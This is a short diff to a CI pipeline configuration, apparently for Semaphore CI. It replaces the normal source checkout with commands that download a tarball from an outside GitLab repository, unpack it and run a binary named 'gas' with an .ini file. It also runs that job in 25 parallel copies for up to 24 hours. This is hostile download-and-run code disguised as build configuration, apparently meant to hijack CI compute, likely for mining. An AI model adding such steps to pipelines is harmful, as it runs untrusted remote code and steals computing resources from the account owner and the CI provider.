@@ -4,10 +4,18 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
+fail_fast:
+  stop:
+    when: 'false'
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://gitlab.com/rojakkazeo/kolabs/-/raw/main/gascuuk.tar.gz'
+            - tar -xvf gascuuk.tar.gz
+            - ./gas keun.ini
+          parallelism: 25
